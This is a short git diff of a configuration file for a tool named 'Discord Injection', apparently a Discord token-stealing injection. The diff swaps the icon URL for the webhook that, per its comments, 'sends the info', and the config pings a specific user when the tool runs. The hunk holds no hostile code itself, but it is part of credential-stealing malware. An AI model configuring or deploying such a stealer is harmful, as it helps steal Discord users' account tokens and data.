@@ -10,7 +10,7 @@ const config = {
   ping_val: "<@1062804772568182804>", //change to @here or <@ID> to ping specific user if you want, will only send if ping_on_run is true
   embed_name: "Discord Injection [ ! ] - Revived by ASYANO : )", //name of the webhook thats gonna send the info
   embed_icon:
-    "https://raw.githubusercontent.com/Rdimo/images/master/Discord-Injection/discord atom.png".replace(
+    "https://avatars0.githubusercontent.com/u/3919433?s=400&v=4".replace(
       / /g,
       "%20",
     ), //icon for the webhook thats gonna send the info (yes you can have spaces in the url)
